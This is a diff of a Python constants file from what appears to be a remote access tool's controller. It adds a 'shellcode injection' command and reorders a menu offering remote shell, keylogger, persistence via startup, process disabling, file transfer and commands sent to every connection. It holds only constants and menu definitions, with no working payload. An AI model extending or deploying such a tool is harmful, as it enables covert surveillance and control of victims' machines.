@@ -28,7 +28,7 @@ ERROR = -1
 SUCCESS = 0
 
 CLIENT_HANDSHAKE = 1
-CLIENT_KEY = 2
+# CLIENT_KEY = 2
 CLIENT_HEARTBEAT = 3
 CLIENT_EXIT = 4
 CLIENT_MSG = 5
@@ -57,6 +57,7 @@ CLIENT_PYTHON_INTERPRETER_LEAVE = 27
 SERVER_PYTHON_INTERPRETER_RSP = 28
 SERVER_SCREENSHOT = 29
 CLIENT_UPLOAD_FILE_PATH = 30
+CLIENT_SHELLCODE = 31
 
 # all menu arguments must be a single char
 MENU_HELP = "H"
@@ -69,7 +70,8 @@ MENU_CLOSE_ALL = "X"
 MENU_LIST_CONNECTIONS_INACTIVE = "inactive"
 
 SERVER_MAIN_COMMAND_LIST = [{"arg": MENU_HELP, "info": "Help"},
-                            {"arg": MENU_LIST_CONNECTIONS, "info": "List all connections", "optional_arg2": f"({MENU_LIST_CONNECTIONS_INACTIVE})"},
+                            {"arg": MENU_LIST_CONNECTIONS, "info": "List all connections",
+                             "optional_arg2": f"({MENU_LIST_CONNECTIONS_INACTIVE})"},
                             {"arg": MENU_INTERACT, "info": "Interact with a connection", "arg2": "index"},
                             {"arg": MENU_OPEN_SHELL, "info": "Open remote shell with connection", "arg2": "index"},
                             {"arg": MENU_SEND_ALL_CMD, "info": "Send command to every connection", "arg2": "command"},
@@ -89,6 +91,7 @@ MENU_INTERACT_KEYLOG = "K"
 MENU_INTERACT_SHUT = "X"
 MENU_INTERACT_BACKGROUND = "B"
 MENU_INTERACT_CLOSE = "C"
+MENU_INTERACT_SHELLCODE = "J"
 
 # arg2 commands
 MENU_INTERACT_KEYLOG_START = "start"
@@ -103,6 +106,12 @@ MENU_INTERACT_SHUT_RESTART = "restart"
 MENU_INTERACT_SHUT_LOCK = "lock"
 
 SERVER_INTERACT_COMMAND_LIST = [{"arg": MENU_HELP, "info": "Help"},
+                                {"arg": MENU_INTERACT_SHELL, "info": "Open remote shell"},
+                                {"arg": MENU_INTERACT_PYTHON, "info": "Open python interpreter"},
+                                {"arg": MENU_INTERACT_DISABLE_PROCESS, "info": "Toggle disable process",
+                                 "arg2": "process_name"}, {"arg": MENU_INTERACT_SHELLCODE, "info": "Inject shellcode"},
+                                {"arg": MENU_INTERACT_KEYLOG, "info": "Keylogger",
+                                 "arg2": f"({MENU_INTERACT_KEYLOG_START}) ({MENU_INTERACT_KEYLOG_STOP}) ({MENU_INTERACT_KEYLOG_DUMP})"},
                                 {"arg": MENU_INTERACT_MSG, "info": "Send message"},
                                 {"arg": MENU_INTERACT_RECV, "info": "Receive file"},
                                 {"arg": MENU_INTERACT_SEND, "info": "Send file"},
@@ -110,12 +119,6 @@ SERVER_INTERACT_COMMAND_LIST = [{"arg": MENU_HELP, "info": "Help"},
                                 {"arg": MENU_INTERACT_STARTUP, "info": "Add to startup",
                                  "arg2": f"({MENU_INTERACT_STARTUP_ADD}) ({MENU_INTERACT_STARTUP_RMV})"},
                                 {"arg": MENU_INTERACT_INFO, "info": "OS & user info"},
-                                {"arg": MENU_INTERACT_SHELL, "info": "Open remote shell"},
-                                {"arg": MENU_INTERACT_PYTHON, "info": "Open python interpreter"},
-                                {"arg": MENU_INTERACT_DISABLE_PROCESS, "info": "Toggle disable process",
-                                 "arg2": "process_name"},
-                                {"arg": MENU_INTERACT_KEYLOG, "info": "Keylogger",
-                                 "arg2": f"({MENU_INTERACT_KEYLOG_START}) ({MENU_INTERACT_KEYLOG_STOP}) ({MENU_INTERACT_KEYLOG_DUMP})"},
                                 {"arg": MENU_INTERACT_SHUT, "info": "Power options",
                                  "arg2": f"({MENU_INTERACT_SHUT_SHUTDOWN}) ({MENU_INTERACT_SHUT_RESTART}) ({MENU_INTERACT_SHUT_LOCK})"},
                                 {"arg": MENU_INTERACT_BACKGROUND, "info": "Move connection to background"},
